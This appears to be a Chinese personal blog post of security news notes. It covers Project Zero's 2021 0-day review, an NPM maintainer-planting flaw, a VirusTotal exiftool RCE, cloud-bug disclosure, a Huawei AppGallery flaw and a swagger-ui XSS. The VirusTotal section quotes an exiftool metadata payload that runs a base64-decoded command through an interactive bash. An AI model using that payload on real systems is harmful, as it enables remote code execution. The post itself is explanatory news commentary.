---
layout: article
title: Interesting news
mathjax: true
key: a00035
cover: /bkgs/3.jpg
modify_date: 2022-5-22
show_author_profile: true
excerpt_type: html
tag: 
- Msic
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

比较有意思的内容。之后应该会把有意思但比较零碎或不太成体系的放在这里？

一些比较有意思的内容。之后应该会把有意思但比较零碎或不太成体系的放在这里？

<!--more-->

# PZ 对2021年野外漏洞利用情况的总结分析

Project Zero认为2021的wild 0-day增加，原因应该归于**检测**和**披露**的增加（比2019多了一倍），而不是wild 0-day本身的增加

从利用技术和利用点来讲，与之前并没有很大的变化，只有两个有创新（58个中），大部分都是内存破坏漏洞（39个，即67%）

- 17个UAF
- 6个越界写/读
- 各4个，缓冲区溢出和整数溢出

2022的展望：

1. 成为行业标准，所有供应商都同意在其安全公告中披露漏洞的野生利用状态。
2. 供应商和安全研究人员共享漏洞利用示例或漏洞利用技术的详细描述
3. 继续共同努力减少内存损坏漏洞或使其无法利用

谈及0-day在野利用的时候，我们谈论的其实是0-day在野利用被**检测**和**披露**的那部分，

检测能力的提高，包括供应商自己研发的检测产品；披露很大程度上依靠的是供应商，研究者通常倾向于匿名提交漏洞。

问题

很多应该有漏洞披露的地方比如聊天软件并没有什么在野0-day漏洞披露，是未检测到？未披露？还是两者皆有？

已知的在野0-day都在使用已知的方式，是事实如此，还是说我们只检测了已知的呢？

漏洞成功利用需要两个条件，漏洞本身，及利用方式，文章本身只分析了漏洞本身（只有5个漏洞有公开的利用方式）



PZ的目标是迫使攻击者在每次他们的漏洞被检测到时都需要从头开始

尽管大部分人不会成为0-day的攻击目标，但0-day的攻击本身影响着我们所有人

2021展示出我们正朝着正确的道路进发，但是还需要继续努力

# NPM maintainer attack

这个月26号之前，任何人都可以在NPM包加上任何贡献者，并且不需要对方的同意。（算是上游供应链攻击？）

因此，上传一个NPM包，加入可信贡献者，然后删除自己，即可构造一个“可信“的NPM包。修复后需要贡献者同意才能添加。

https://blog.aquasec.com/npm-package-planting

# VT RCE

和去年年底的GitLab RCE有点类似，都利用了exiftool 

```
content: (metadata "\c${system('bash -c \"{echo,BASE64-ENCODED-COMMAND-TO-BE-EXECUTED }|{base64,-d }|{bash,-i }\" ; clear') };")
```

https://www.cysrc.com/blog/virus-total-blog/

# CVE-Like Cloud Bug System

可以和第一个结合着看

云厂商有时会悄悄修复云上的漏洞，并且不公开相关细节。

可以考虑比如先修，然后再通知到受影响的客户，使其能够知晓漏洞并做出相应的操作

有个有意思的问题，CVE识别规则只认终端用户和网络管理员可以直接管理的漏洞，但是云上漏洞属于厂商自己，现有CVE规则不太适用于云

https://threatpost.com/cve-cloud-bug-system/179394/

# 华为任意APP下载

利用似乎还蛮简单的？最后Timeline部分挺有意思

https://evowizz.dev/blog/huawei-appgallery-vulnerability

# swagger-ui XSS

比较老的问题，但是还有很多没修，问题主要出在过期的`DomPurify`，范围：>=3.14.1 < 3.38.0，升到4.13.0即可

https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/